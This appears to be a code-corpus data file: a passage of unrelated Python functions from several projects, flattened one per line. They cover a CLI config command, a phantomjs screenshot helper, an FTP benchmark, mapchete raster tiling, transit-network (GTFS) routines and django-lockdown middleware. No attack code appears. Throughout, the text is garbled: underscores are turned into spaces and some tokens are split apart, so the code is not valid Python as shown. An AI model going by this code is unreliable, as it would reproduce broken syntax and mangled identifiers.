ick.f o rmat filename(t w tfile)) )
def config ( ctx , key , value , remove , edit ) : conf = ctx . obj [ "conf" ] if not edit and not key : raise click . Bad Argument Usage ( "You have to specify either a key or use --edit." ) if edit : return click . edit ( filename = conf . config file ) if remove : try : conf . cfg . remove option ( key [ 0 ] , key [ 1 ] ) except Exception as e : logger . debug ( e ) else : conf . write config ( ) return if not value : try : click . echo ( conf . cfg . get ( key [ 0 ] , key [ 1 ] ) ) except Exception as e : logger . debug ( e ) return if not conf . cfg . has section ( key [ 0 ] ) : conf . cfg . add section ( key [ 0 ] ) conf . cfg . set ( key [ 0 ] , key [ 1 ] , value ) conf . write config ( )
def relative datetime ( self ) : now = datetime . now ( timezone . utc ) tense = "from now" if self . created at > now else "ago" return "{0} {1}" . format ( humanize . naturaldelta ( now - self . created at ) , tense )
def save ( url , * args , * * kwargs ) : device = heimdall Device ( kwargs . get ( 'device' , None ) ) kwargs [ 'width' ] = kwargs . get ( 'width' , None ) or device . width kwargs [ 'height' ] = kwargs . get ( 'height' , None ) or device . height kwargs [ 'user agent' ] = kwargs . get ( 'user agent' , None ) or device . user agent screenshot image = screenshot ( url , * * kwargs ) if kwargs . get ( 'optimize' ) : image = Image . open ( screenshot image . path ) image . save ( screenshot image . path , optimize = True ) return screenshot image
def screenshot ( url , * args , * * kwargs ) : phantomscript = os . path . join ( os . path . dirname ( file ) , 'take screenshot.js' ) directory = kwargs . get ( 'save dir' , '/tmp' ) image name = kwargs . get ( 'image name' , None ) or image name from url ( url ) ext = kwargs . get ( 'format' , 'png' ) . lower ( ) save path = os . path . join ( directory , image name ) + '.' + ext crop to visible = kwargs . get ( 'crop to visible' , False ) cmd args = [ 'phantomjs' , '--ssl-protocol=any' , phantomscript , url , '--width' , str ( kwargs [ 'width' ] ) , '--height' , str ( kwargs [ 'height' ] ) , '--useragent' , str ( kwargs [ 'user agent' ] ) , '--dir' , directory , '--ext' , ext , '--name' , str ( image name ) , ] if crop to visible : cmd args . append ( '--croptovisible' ) # TODO: # - quality # - renderafter # - maxexecutiontime # - resourcetimeout output = subprocess . Popen ( cmd args , stdout = subprocess . PIPE ) . communicate ( ) [ 0 ] return Screenshot ( save path , directory , image name + '.' + ext , ext )
def image name from url ( url ) : find = r'https?://|[^\w]' replace = ' ' return re . sub ( find , replace , url ) . strip ( ' ' )
def release ( self ) : if self . value is not None : self . value += 1 if self . value > self . maximum value : raise Value Error ( "Too many releases" )
def connect ( ) : ftp class = ftplib . FTP if not SSL else ftplib . FTP TLS ftp = ftp class ( timeout = TIMEOUT ) ftp . connect ( HOST , PORT ) ftp . login ( USER , PASSWORD ) if SSL : ftp . prot p ( ) # secure data connection return ftp
def bytes per second ( ftp , retr = True ) : tot bytes = 0 if retr : def request file ( ) : ftp . voidcmd ( 'TYPE I' ) conn = ftp . transfercmd ( "retr " + TESTFN ) return conn with contextlib . closing ( request file ( ) ) as conn : register memory ( ) stop at = time . time ( ) + 1.0 while stop at > time . time ( ) : chunk = conn . recv ( BUFFER LEN ) if not chunk : a = time . time ( ) ftp . voidresp ( ) conn . close ( ) conn = request file ( ) stop at += time . time ( ) - a tot bytes += len ( chunk ) try : while chunk : chunk = conn . recv ( BUFFER LEN ) ftp . voidresp ( ) conn . close ( ) except ( ftplib . error temp , ftplib . error perm ) : pass else : ftp . voidcmd ( 'TYPE I' ) with contextlib . closing ( ftp . transfercmd ( "STOR " + TESTFN ) ) as conn : register memory ( ) chunk = b'x' * BUFFER LEN stop at = time . time ( ) + 1 while stop at > time . time ( ) : tot bytes += conn . send ( chunk ) ftp . voidresp ( ) return tot bytes
def clone ( self ) : return Stream Throttle ( read = self . read . clone ( ) , write = self . write . clone ( ) )
def get zoom level ( zoom , process ) : if zoom is None : return reversed ( process . config . zoom levels ) if isinstance ( zoom , int ) : return [ zoom ] elif len ( zoom ) == 2 : return reversed ( range ( min ( zoom ) , max ( zoom ) + 1 ) ) elif len ( zoom ) == 1 : return zoom
def process worker ( process , process tile ) : logger . debug ( ( process tile . id , "running on %s" % current process ( ) . name ) ) # skip execution if overwrite is disabled and tile exists if ( process . config . mode == "continue" and process . config . output . tiles exist ( process tile ) ) : logger . debug ( ( process tile . id , "tile exists, skipping" ) ) return Process Info ( tile = process tile , processed = False , process msg = "output already exists" , written = False , write msg = "nothing written" ) # execute on process tile else : with Timer ( ) as t : try : output = process . execute ( process tile , raise nodata = True ) except Mapchete Nodata Tile : output = None processor message = "processed in %s" % t logger . debug ( ( process tile . id , processor message ) ) writer info = process . write ( process tile , output ) return Process Info ( tile = process tile , processed = True , process msg = processor message , written = writer info . written , write msg = writer info . write msg )
def extract ( self , in tile = None , in data = None , out tile = None ) : return self . config . output . extract subset ( input data tiles = [ ( in tile , in data ) ] , out tile = out tile )
def pyramid ( input raster , output dir , pyramid type = None , output format = None , resampling method = None , scale method = None , zoom = None , bounds = None , overwrite = False , debug = False ) : bounds = bounds if bounds else None options = dict ( pyramid type = pyramid type , scale method = scale method , output format = output format , resampling = resampling method , zoom = zoom , bounds = bounds , overwrite = overwrite ) raster2pyramid ( input raster , output dir , options )
def raster2pyramid ( input file , output dir , options ) : pyramid type = options [ "pyramid type" ] scale method = options [ "scale method" ] output format = options [ "output format" ] resampling = options [ "resampling" ] zoom = options [ "zoom" ] bounds = options [ "bounds" ] mode = "overwrite" if options [ "overwrite" ] else "continue" # Prepare process parameters minzoom , maxzoom = get zoom ( zoom , input file , pyramid type ) with rasterio . open ( input file , "r" ) as input raster : output bands = input raster . count input dtype = input raster . dtypes [ 0 ] output dtype = input raster . dtypes [ 0 ] nodataval = input raster . nodatavals [ 0 ] nodataval = nodataval if nodataval else 0 if output format == "PNG" and output bands > 3 : output bands = 3 output dtype = 'uint8' scales minmax = ( ) if scale method == "dtype scale" : for index in range ( 1 , output bands + 1 ) : scales minmax += ( DTYPE RANGES [ input dtype ] , ) elif scale method == "minmax scale" : for index in range ( 1 , output bands + 1 ) : band = input raster . read ( index ) scales minmax += ( ( band . min ( ) , band . max ( ) ) , ) elif scale method == "crop" : for index in range ( 1 , output bands + 1 ) : scales minmax += ( ( 0 , 255 ) , ) if input dtype == "uint8" : scale method = None scales minmax = ( ) for index in range ( 1 , output bands + 1 ) : scales minmax += ( ( None , None ) , ) # Create configuration config = dict ( process = "mapchete.processes.pyramid.tilify" , output = { "path" : output dir , "format" : output format , "bands" : output bands , "dtype" : output dtype } , pyramid = dict ( pixelbuffer = 5 , grid = pyramid type ) , scale method = scale method , scales minmax = scales minmax , input = { "raster" : input file } , config dir = os . getcwd ( ) , zoom levels = dict ( min = minzoom , max = maxzoom ) , nodataval = nodataval , resampling = resampling , bounds = bounds , baselevel = { "zoom" : maxzoom , "resampling" : resampling } , mode = mode ) # create process with mapchete . open ( config , zoom = zoom , bounds = bounds ) as mp : # prepare output directory if not os . path . exists ( output dir ) : os . makedirs ( output dir ) # run process mp . batch process ( zoom = [ minzoom , maxzoom ] )
def get zoom ( zoom , input raster , pyramid type ) : if not zoom : minzoom = 1 maxzoom = get best zoom level ( input raster , pyramid type ) elif len ( zoom ) == 1 : minzoom = zoom [ 0 ] maxzoom = zoom [ 0 ] elif len ( zoom ) == 2 : if zoom [ 0 ] < zoom [ 1 ] : minzoom = zoom [ 0 ] maxzoom = zoom [ 1 ] else : minzoom = zoom [ 1 ] maxzoom = zoom [ 0 ] return minzoom , maxzoom
def get hash ( x ) : if isinstance ( x , str ) : return hash ( x ) elif isinstance ( x , dict ) : return hash ( yaml . dump ( x ) )
def get zoom levels ( process zoom levels = None , init zoom levels = None ) : process zoom levels = validate zooms ( process zoom levels ) if init zoom levels is None : return process zoom levels else : init zoom levels = validate zooms ( init zoom levels ) if not set ( init zoom levels ) . issubset ( set ( process zoom levels ) ) : raise Mapchete Config Error ( "init zooms must be a subset of process zoom" ) return init zoom levels
def raw at zoom ( config , zooms ) : params per zoom = { } for zoom in zooms : params = { } for name , element in config . items ( ) : if name not in RESERVED PARAMETERS : out element = element at zoom ( name , element , zoom ) if out element is not None : params [ name ] = out element params per zoom [ zoom ] = params return params per zoom
def filter by zoom ( element = None , conf string = None , zoom = None ) : for op str , op func in [ # order of operators is important: # prematurely return in cases of "<=" or ">=", otherwise #  strip zoom() cannot parse config strings starting with "<" # or ">" ( "=" , operator . eq ) , ( "<=" , operator . le ) , ( ">=" , operator . ge ) , ( "<" , operator . lt ) , ( ">" , operator . gt ) , ] : if conf string . startswith ( op str ) : return element if op func ( zoom , strip zoom ( conf string , op str ) ) else None
def strip zoom ( input string , strip string ) : try : return int ( input string . strip ( strip string ) ) except Exception as e : raise Mapchete Config Error ( "zoom level could not be determined: %s" % e )
def flatten tree ( tree , old path = None ) : flat tree = [ ] for key , value in tree . items ( ) : new path = "/" . join ( [ old path , key ] ) if old path else key if isinstance ( value , dict ) and "format" not in value : flat tree . extend ( flatten tree ( value , old path = new path ) ) else : flat tree . append ( ( new path , value ) ) return flat tree
def unflatten tree ( flat ) : tree = { } for key , value in flat . items ( ) : path = key . split ( "/" ) # we are at the end of a branch if len ( path ) == 1 : tree [ key ] = value # there are more branches else : # create new dict if not path [ 0 ] in tree : tree [ path [ 0 ] ] = unflatten tree ( { "/" . join ( path [ 1 : ] ) : value } ) # add keys to existing dict else : branch = unflatten tree ( { "/" . join ( path [ 1 : ] ) : value } ) if not path [ 1 ] in tree [ path [ 0 ] ] : tree [ path [ 0 ] ] [ path [ 1 ] ] = branch [ path [ 1 ] ] else : tree [ path [ 0 ] ] [ path [ 1 ] ] . update ( branch [ path [ 1 ] ] ) return tree
def bounds ( self ) : if self . raw [ "bounds" ] is None : return self . process pyramid . bounds else : return Bounds ( * validate bounds ( self . raw [ "bounds" ] ) )
def output ( self ) : output params = dict ( self . raw [ "output" ] , grid = self . output pyramid . grid , pixelbuffer = self . output pyramid . pixelbuffer , metatiling = self . output pyramid . metatiling ) if "path" in output params : output params . update ( path = absolute path ( path = output params [ "path" ] , base dir = self . config dir ) ) if "format" not in output params : raise Mapchete Config Error ( "output format not specified" ) if output params [ "format" ] not in available output formats ( ) : raise Mapchete Config Error ( "format %s not available in %s" % ( output params [ "format" ] , str ( available output formats ( ) ) ) ) writer = load output writer ( output params ) try : writer . is valid with config ( output params ) except Exception as e : logger . exception ( e ) raise Mapchete Config Error ( "driver %s not compatible with configuration: %s" % ( writer . METADATA [ "driver name" ] , e ) ) return writer
def profile ( self ) : with rasterio . open ( self . path , "r" ) as src : return deepcopy ( src . meta )
def get band indexes ( self , indexes = None ) : if indexes : if isinstance ( indexes , list ) : return indexes else : return [ indexes ] else : return range ( 1 , self . raster file . profile [ "count" ] + 1 )
def execute ( mapchete files , zoom = None , bounds = None , point = None , wkt geometry = None , tile = None , overwrite = False , multi = None , input file = None , logfile = None , verbose = False , no pbar = False , debug = False , max chunksize = None , vrt = False , idx out dir = None ) : multi = multi if multi else cpu count ( ) mode = "overwrite" if overwrite else "continue" # send verbose messages to /dev/null if not activated if debug or not verbose : verbose dst = open ( os . devnull , 'w' ) else : verbose dst = sys . stdout for mapchete file in mapchete files : tqdm . tqdm . write ( "preparing to process %s" % mapchete file , file = verbose dst ) with click spinner . spinner ( disable = debug ) as spinner : # process single tile if tile : tile = raw conf process pyramid ( raw conf ( mapchete file ) ) . tile ( * tile ) with mapchete . open ( mapchete file , mode = mode , bounds = tile . bounds , zoom = tile . zoom , single input file = input file ) as mp : spinner . stop ( ) tqdm . tqdm . write ( "processing 1 tile" , file = verbose dst ) # run process on tile for result in mp . batch processor ( tile = tile ) : utils . write verbose msg ( result , dst = verbose dst ) tqdm . tqdm . write ( "processing %s finished" % mapchete file , file = verbose dst ) # write VRT index if vrt : tqdm . tqdm . write ( "creating VRT" , file = verbose dst ) for tile in tqdm . tqdm ( zoom index gen ( mp = mp , zoom = tile . zoom , out dir = ( idx out dir if idx out dir else mp . config . output . path ) , vrt = vrt , ) , total = mp . count tiles ( tile . zoom , tile . zoom ) , unit = "tile" , disable = debug or no pbar ) : logger . debug ( "%s indexed" , tile ) tqdm . tqdm . write ( "VRT(s) creation for %s finished" % mapchete file , file = verbose dst ) # process area else : with mapchete . open ( mapchete file , mode = mode , zoom = zoom , bounds = bounds from opts ( wkt geometry = wkt geometry , point = point , bounds = bounds , raw conf = raw conf ( mapchete file ) ) , single input file = input file ) as mp : spinner . stop ( ) tiles count = mp . count tiles ( min ( mp . config . init zoom levels ) , max ( mp . config . init zoom levels ) ) tqdm . tqdm . write ( "processing %s tile(s) on %s worker(s)" % ( tiles count , multi ) , file = verbose dst ) # run process on tiles for process info in tqdm . tqdm ( mp . batch processor ( multi = multi , zoom = zoom , max chunksize = max chunksize ) , total = tiles count , unit = "tile" , disable = debug or no pbar ) : utils . write verbose msg ( process info , dst = verbose dst ) tqdm . tqdm . write ( "processing %s finished" % mapchete file , file = verbose dst ) # write VRT index if vrt : tqdm . tqdm . write ( "creating VRT(s)" , file = verbose dst ) for tile in tqdm . tqdm ( zoom index gen ( mp = mp , zoom = mp . config . init zoom levels , out dir = ( idx out dir if idx out dir else mp . config . output . path ) , vrt = vrt ) , total = mp . count tiles ( min ( mp . config . init zoom levels ) , max ( mp . config . init zoom levels ) ) , unit = "tile" , disable = debug or no pbar ) : logger . debug ( "%s indexed" , tile ) tqdm . tqdm . write ( "VRT(s) creation for %s finished" % mapchete file , file = verbose dst )
def write output metadata ( output params ) : if "path" in output params : metadata path = os . path . join ( output params [ "path" ] , "metadata.json" ) logger . debug ( "check for output %s" , metadata path ) try : existing params = read output metadata ( metadata path ) logger . debug ( "%s exists" , metadata path ) logger . debug ( "existing output parameters: %s" , pformat ( existing params ) ) existing tp = existing params [ "pyramid" ] current params = params to dump ( output params ) logger . debug ( "current output parameters: %s" , pformat ( current params ) ) current tp = Buffered Tile Pyramid ( * * current params [ "pyramid" ] ) if existing tp != current tp : raise Mapchete Config Error ( "pyramid definitions between existing and new output do not match: " "%s != %s" % ( existing tp , current tp ) ) existing format = existing params [ "driver" ] [ "format" ] current format = current params [ "driver" ] [ "format" ] if existing format != current format : raise Mapchete Config Error ( "existing output format does not match new output format: " "%s != %s" % ( ( existing format , current format ) ) ) except File Not Found Error : logger . debug ( "%s does not exist" , metadata path ) dump params = params to dump ( output params ) # dump output metadata write json ( metadata path , dump params ) else : logger . debug ( "no path parameter found" )
def get contour values ( min val , max val , base = 0 , interval = 100 ) : i = base out = [ ] if min val < base : while i >= min val : i -= interval while i <= max val : if i >= min val : out . append ( i ) i += interval return out
def create ( mapchete file , process file , out format , out path = None , pyramid type = None , force = False ) : if os . path . isfile ( process file ) or os . path . isfile ( mapchete file ) : if not force : raise IO Error ( "file(s) already exists" ) out path = out path if out path else os . path . join ( os . getcwd ( ) , "output" ) # copy file template to target directory process template = pkg resources . resource filename ( "mapchete.static" , "process template.py" ) process file = os . path . join ( os . getcwd ( ) , process file ) copyfile ( process template , process file ) # modify and copy mapchete file template to target directory mapchete template = pkg resources . resource filename ( "mapchete.static" , "mapchete template.mapchete" ) output options = dict ( format = out format , path = out path , * * FORMAT MANDATORY [ out format ] ) pyramid options = { 'grid' : pyramid type } substitute elements = { 'process file' : process file , 'output' : dump ( { 'output' : output options } , default flow style = False ) , 'pyramid' : dump ( { 'pyramid' : pyramid options } , default flow style = False ) } with open ( mapchete template , 'r' ) as config template : config = Template ( config template . read ( ) ) customized config = config . substitute ( substitute elements ) with open ( mapchete file , 'w' ) as target config : target config . write ( customized config )
def to dict ( self ) : return dict ( grid = self . grid . to dict ( ) , metatiling = self . metatiling , tile size = self . tile size , pixelbuffer = self . pixelbuffer )
def is on edge ( self ) : return ( self . left <= self . tile pyramid . left or # touches left self . bottom <= self . tile pyramid . bottom or # touches bottom self . right >= self . tile pyramid . right or # touches right self . top >= self . tile pyramid . top # touches top )
def get band indexes ( self , indexes = None ) : if indexes : if isinstance ( indexes , list ) : return indexes else : return [ indexes ] else : return range ( 1 , self . process . config . output . profile ( self . tile ) [ "count" ] + 1 )
def create app ( mapchete files = None , zoom = None , bounds = None , single input file = None , mode = "continue" , debug = None ) : from flask import Flask , render template string app = Flask ( name ) mapchete processes = { os . path . splitext ( os . path . basename ( mapchete file ) ) [ 0 ] : mapchete . open ( mapchete file , zoom = zoom , bounds = bounds , single input file = single input file , mode = mode , with cache = True , debug = debug ) for mapchete file in mapchete files } mp = next ( iter ( mapchete processes . values ( ) ) ) pyramid type = mp . config . process pyramid . grid pyramid srid = mp . config . process pyramid . crs . to epsg ( ) process bounds = "," . join ( [ str ( i ) for i in mp . config . bounds at zoom ( ) ] ) grid = "g" if pyramid srid == 3857 else "WGS84" web pyramid = Buffered Tile Pyramid ( pyramid type ) @ app . route ( '/' , methods = [ 'GET' ] ) def index ( ) : """Render and hosts the appropriate Open Layers instance.""" return render template string ( pkgutil . get data ( 'mapchete.static' , 'index.html' ) . decode ( "utf-8" ) , srid = pyramid srid , process bounds = process bounds , is mercator = ( pyramid srid == 3857 ) , process names = mapchete processes . keys ( ) ) @ app . route ( "/" . join ( [ "" , "wmts simple" , "1.0.0" , "<string:mp name>" , "default" , grid , "<int:zoom>" , "<int:row>" , "<int:col>.<string:file ext>" ] ) , methods = [ 'GET' ] ) def get ( mp name , zoom , row , col , file ext ) : """Return processed, empty or error (in pink color) tile.""" logger . debug ( "received tile (%s, %s, %s) for process %s" , zoom , row , col , mp name ) # convert zoom, row, col into tile object using web pyramid return tile response ( mapchete processes [ mp name ] , web pyramid . tile ( zoom , row , col ) , debug ) return app
def get warped array ( input file = None , indexes = None , dst bounds = None , dst shape = None , dst crs = None , resampling = None , src nodata = None , dst nodata = None ) : try : return rasterio read ( input file = input file , indexes = indexes , dst bounds = dst bounds , dst shape = dst shape , dst crs = dst crs , resampling = resampling , src nodata = src nodata , dst nodata = dst nodata ) except Exception as e : logger . exception ( "error while reading file %s: %s" , input file , e ) raise
def shift required ( tiles ) : if tiles [ 0 ] [ 0 ] . tile pyramid . is global : # get set of tile columns tile cols = sorted ( list ( set ( [ t [ 0 ] . col for t in tiles ] ) ) ) # if tile columns are an unbroken sequence, tiles are connected and are not # passing the Antimeridian if tile cols == list ( range ( min ( tile cols ) , max ( tile cols ) + 1 ) ) : return False else : # look at column gaps and try to determine the smallest distance def gen groups ( items ) : """Groups tile columns by sequence.""" j = items [ 0 ] group = [ j ] for i in items [ 1 : ] : # item is next in expected sequence if i == j + 1 : group . append ( i ) # gap occured, so yield existing group and create new one else : yield group group = [ i ] j = i yield group groups = list ( gen groups ( tile cols ) ) # in case there is only one group, don't shift if len ( groups ) == 1 : return False # distance between first column of first group and last column of last group normal distance = groups [ - 1 ] [ - 1 ] - groups [ 0 ] [ 0 ] # distance between last column of first group and last column of first group # but crossing the antimeridian antimeridian distance = ( groups [ 0 ] [ - 1 ] + tiles [ 0 ] [ 0 ] . tile pyramid . matrix width ( tiles [ 0 ] [ 0 ] . zoom ) ) - groups [ - 1 ] [ 0 ] # return whether distance over antimeridian is shorter return antimeridian distance < normal distance else : return False
def write json ( path , params ) : logger . debug ( "write %s to %s" , params , path ) if path . startswith ( "s3://" ) : bucket = get boto3 bucket ( path . split ( "/" ) [ 2 ] ) key = "/" . join ( path . split ( "/" ) [ 3 : ] ) logger . debug ( "upload %s" , key ) bucket . put object ( Key = key , Body = json . dumps ( params , sort keys = True , indent = 4 ) ) else : makedirs ( os . path . dirname ( path ) ) with open ( path , 'w' ) as dst : json . dump ( params , dst , sort keys = True , indent = 4 )
def read json ( path ) : if path . startswith ( ( "http://" , "https://" ) ) : try : return json . loads ( urlopen ( path ) . read ( ) . decode ( ) ) except HTTP Error : raise File Not Found Error ( "%s not found" , path ) elif path . startswith ( "s3://" ) : bucket = get boto3 bucket ( path . split ( "/" ) [ 2 ] ) key = "/" . join ( path . split ( "/" ) [ 3 : ] ) for obj in bucket . objects . filter ( Prefix = key ) : if obj . key == key : return json . loads ( obj . get ( ) [ 'Body' ] . read ( ) . decode ( ) ) raise File Not Found Error ( "%s not found" , path ) else : try : with open ( path , "r" ) as src : return json . loads ( src . read ( ) ) except : raise File Not Found Error ( "%s not found" , path )
def get digest ( self ) : return hmac . new ( self . secret , request . data , hashlib . sha1 ) . hexdigest ( ) if self . secret else None
def long description ( ) : import argparse parser = argparse . Argument Parser ( ) parser . add argument ( '--doc' , dest = "doc" , action = "store true" , default = False ) args , sys . argv = parser . parse known args ( sys . argv ) if args . doc : import doc2md , pypandoc md = doc2md . doc2md ( doc2md . doc , "doc2md" , toc = False ) long description = pypandoc . convert ( md , 'rst' , format = 'md' ) else : return None
def find sections ( lines ) : sections = [ ] for line in lines : if is heading ( line ) : sections . append ( get heading ( line ) ) return sections
def make toc ( sections , maxdepth = 0 ) : if not sections : return [ ] outer = min ( n for n , t in sections ) refs = [ ] for ind , sec in sections : if maxdepth and ind - outer + 1 > maxdepth : continue ref = sec . lower ( ) ref = ref . replace ( '`' , '' ) ref = ref . replace ( ' ' , '-' ) ref = ref . replace ( '?' , '' ) refs . append ( "    " * ( ind - outer ) + "- [%s](#%s)" % ( sec , ref ) ) return refs
def doc2md ( docstr , title , min level = 1 , more info = False , toc = True , maxdepth = 0 ) : text = doctrim ( docstr ) lines = text . split ( '\n' ) sections = find sections ( lines ) if sections : level = min ( n for n , t in sections ) - 1 else : level = 1 shiftlevel = 0 if level < min level : shiftlevel = min level - level level = min level sections = [ ( lev + shiftlevel , tit ) for lev , tit in sections ] head = next ( ( i for i , l in enumerate ( lines ) if is heading ( l ) ) , 0 ) md = [ make heading ( level , title ) , "" , ] + lines [ : head ] if toc : md += make toc ( sections , maxdepth ) md += [ '' ] md += doc2md ( lines [ head : ] , shiftlevel ) if more info : return ( md , sections ) else : return "\n" . join ( md )
def mod2md ( module , title , title api section , toc = True , maxdepth = 0 ) : docstr = module . doc text = doctrim ( docstr ) lines = text . split ( '\n' ) sections = find sections ( lines ) if sections : level = min ( n for n , t in sections ) - 1 else : level = 1 api md = [ ] api sec = [ ] if title api section and module . all : sections . append ( ( level + 1 , title api section ) ) for name in module . all : api sec . append ( ( level + 2 , "`" + name + "`" ) ) api md += [ '' , '' ] entry = module . dict [ name ] if entry . doc : md , sec = doc2md ( entry . doc , "`" + name + "`" , min level = level + 2 , more info = True , toc = False ) api sec += sec api md += md sections += api sec # headline head = next ( ( i for i , l in enumerate ( lines ) if is heading ( l ) ) , 0 ) md = [ make heading ( level , title ) , "" , ] + lines [ : head ] # main sections if toc : md += make toc ( sections , maxdepth ) md += [ '' ] md += doc2md ( lines [ head : ] ) # API section md += [ '' , '' , make heading ( level + 1 , title api section ) , ] if toc : md += [ '' ] md += make toc ( api sec , 1 ) md += api md return "\n" . join ( md )
def get min visit time ( self ) : if not self . visit events : return float ( 'inf' ) else : return min ( self . visit events , key = lambda event : event . arr time ut ) . arr time ut
def can infect ( self , event ) : if event . from stop I != self . stop I : return False if not self . has been visited ( ) : return False else : time sep = event . dep time ut - self . get min visit time ( ) # if the gap between the earliest visit time and current time is # smaller than the min. transfer time, the stop can pass the spreading # forward if ( time sep >= self . min transfer time ) or ( event . trip I == - 1 and time sep >= 0 ) : return True else : for visit in self . visit events : # if no transfer, please hop-on if ( event . trip I == visit . trip I ) and ( time sep >= 0 ) : return True return False
def createcolorbar ( cmap , norm ) : cax , kw = matplotlib . colorbar . make axes ( matplotlib . pyplot . gca ( ) ) c = matplotlib . colorbar . Colorbar Base ( cax , cmap = cmap , norm = norm ) return c
def scan footpaths to departure stop ( self , connection dep stop , connection dep time , arrival time target ) : for , neighbor , data in self . walk network . edges iter ( nbunch = [ connection dep stop ] , data = True ) : d walk = data [ 'd walk' ] neighbor dep time = connection dep time - d walk / self . walk speed pt = Label Time Simple ( departure time = neighbor dep time , arrival time target = arrival time target ) self . stop profiles [ neighbor ] . update pareto optimal tuples ( pt )
def finalize profiles ( self ) : for stop , stop profile in self . stop profiles . items ( ) : assert ( isinstance ( stop profile , Node Profile Multi Objective ) ) neighbor label bags = [ ] walk durations to neighbors = [ ] departure arrival stop pairs = [ ] if stop profile . get walk to target duration ( ) != 0 and stop in self . walk network . node : neighbors = networkx . all neighbors ( self . walk network , stop ) for neighbor in neighbors : neighbor profile = self . stop profiles [ neighbor ] assert ( isinstance ( neighbor profile , Node Profile Multi Objective ) ) neighbor real connection labels = neighbor profile . get labels for real connections ( ) neighbor label bags . append ( neighbor real connection labels ) walk durations to neighbors . append ( int ( self . walk network . get edge data ( stop , neighbor ) [ "d walk" ] / self . walk speed ) ) departure arrival stop pairs . append ( ( stop , neighbor ) ) stop profile . finalize ( neighbor label bags , walk durations to neighbors , departure arrival stop pairs )
def validate day start ut ( conn ) : G = GTFS ( conn ) cur = conn . execute ( 'SELECT date, day start ut FROM days' ) for date , day start ut in cur : #print date, day start ut assert day start ut == G . get day start ut ( date )
def main make views ( gtfs fname ) : print ( "creating views" ) conn = GTFS ( fname or conn = gtfs fname ) . conn for L in Loaders : L ( None ) . make views ( conn ) conn . commit ( )
def run ( self ) : if self . has run : raise Runtime Error ( "This spreader instance has already been run: " "create a new Spreader object for a new run." ) i = 1 while self . event heap . size ( ) > 0 and len ( self . uninfected stops ) > 0 : event = self . event heap . pop next event ( ) this stop = self . stop I to spreading stop [ event . from stop I ] if event . arr time ut > self . start time ut + self . max duration ut : break if this stop . can infect ( event ) : target stop = self . stop I to spreading stop [ event . to stop I ] already visited = target stop . has been visited ( ) target stop . visit ( event ) if not already visited : self . uninfected stops . remove ( event . to stop I ) print ( i , self . event heap . size ( ) ) transfer distances = self . gtfs . get straight line transfer distances ( event . to stop I ) self . event heap . add walk events to heap ( transfer distances , event , self . start time ut , self . walk speed , self . uninfected stops , self . max duration ut ) i += 1 self . has run = True
def insert data ( self , conn ) : cur = conn . cursor ( ) # This is a bit hackish.  It is annoying to have to write the # INSERT statement yourself and keep it up to date with the # table rows.  This gets the first row, figures out the field # names from that, and then makes an INSERT statement like # "INSERT INTO table (col1, col2, ...) VALUES (:col1, :col2, # ...)".  The ":col1" is sqlite syntax for named value. csv reader generators , prefixes = self . get csv reader generators ( ) for csv reader , prefix in zip ( csv reader generators , prefixes ) : try : row = next ( iter ( self . gen rows ( [ csv reader ] , [ prefix ] ) ) ) fields = row . keys ( ) except Stop Iteration : # The file has *only* a header and no data. # next(iter()) yields Stop Iteration and we can't # proceed.  Since there is nothing to import, just continue the loop print ( "Not importing %s into %s for %s" % ( self . fname , self . table , prefix ) ) continue stmt = '''INSERT INTO %s (%s) VALUES (%s)''' % ( self . table , ( ', ' . join ( [ x for x in fields if x [ 0 ] != ' ' ] + self . extra keys ) ) , ( ', ' . join ( [ ":" + x for x in fields if x [ 0 ] != ' ' ] + self . extra values ) ) ) # This does the actual insertions.  Passed the INSERT # statement and then an iterator over dictionaries.  Each # dictionary is inserted. if self . print progress : print ( 'Importing %s into %s for %s' % ( self . fname , self . table , prefix ) ) # the first row was consumed by fetching the fields # (this could be optimized) from itertools import chain rows = chain ( [ row ] , self . gen rows ( [ csv reader ] , [ prefix ] ) ) cur . executemany ( stmt , rows ) conn . commit ( )
def get vehicle hours by type ( gtfs , route type ) : day = gtfs . get suitable date for daily extract ( ) query = ( " SELECT * , SUM(end time ds - start time ds)/3600 as vehicle hours type" " FROM" " (SELECT * FROM day trips as q1" " INNER JOIN" " (SELECT route I, type FROM routes) as q2" " ON q1.route I = q2.route I" " WHERE type = {route type}" " AND date = '{day}')" . format ( day = day , route type = route type ) ) df = gtfs . execute custom query pandas ( query ) return df [ 'vehicle hours type' ] . item ( )
def clean password ( self ) : value = self . cleaned data . get ( 'password' ) if value not in self . valid passwords : raise forms . Validation Error ( 'Incorrect password.' ) return value
def clean ( self ) : cleaned data = super ( Auth Form , self ) . clean ( ) user = self . get user ( ) if self . staff only and ( not user or not user . is staff ) : raise forms . Validation Error ( 'Sorry, only staff are allowed.' ) if self . superusers only and ( not user or not user . is superuser ) : raise forms . Validation Error ( 'Sorry, only superusers are allowed.' ) return cleaned data
def get lockdown form ( form path ) : if not form path : raise Improperly Configured ( 'No LOCKDOWN FORM specified.' ) form path list = form path . split ( "." ) new module = "." . join ( form path list [ : - 1 ] ) attr = form path list [ - 1 ] try : mod = import module ( new module ) except ( Import Error , Value Error ) : raise Improperly Configured ( 'Module configured in LOCKDOWN FORM (%s) to' ' contain the form class couldn\'t be ' 'found.' % new module ) try : form = getattr ( mod , attr ) except Attribute Error : raise Improperly Configured ( 'The module configured in LOCKDOWN FORM ' ' (%s) doesn\'t define a "%s" form.' % ( new module , attr ) ) return form
def process request ( self , request ) : try : session = request . session except Attribute Error : raise Improperly Configured ( 'django-lockdown requires the Django ' 'sessions framework' ) # Don't lock down if django-lockdown is disabled altogether. if settings . ENABLED is False : return None # Don't lock down if the client REMOTE ADDR matched and is part of the # exception list. if self . remote addr exceptions : remote addr exceptions = self . remote addr exceptions else : remote addr exceptions = settings . REMOTE ADDR EXCEPTIONS if remote addr exceptions : # If forwarding proxies are used they must be listed as trusted trusted proxies = self . trusted proxies or settings . TRUSTED PROXIES remote addr = request . META . get ( 'REMOTE ADDR' ) if remote addr in remote addr exceptions : return None if remote addr in trusted proxies : # If REMOTE ADDR is a trusted proxy check x-forwarded-for x forwarded for = request . META . get ( 'HTTP X FORWARDED FOR' ) if x forwarded for : remote addr = x forwarded for . split ( ',' ) [ - 1 ] . strip ( ) if remote addr in remote addr exceptions : return None # Don't lock down if the URL matches an exception pattern. if self . url exceptions : url exceptions = compile url exceptions ( self . url exceptions ) else : url exceptions = compile url exceptions ( settings . URL EXCEPTIONS ) for pattern in url exceptions : if pattern . search ( request . path ) : return None # Don't lock down if the URL resolves to a whitelisted view. try : resolved path = resolve ( request . path ) except Resolver404 : pass else : if resolved path . func in settings . VIEW EXCEPTIONS : return None # Don't lock down if outside of the lockdown dates. if self . until date : until date = self . until date else 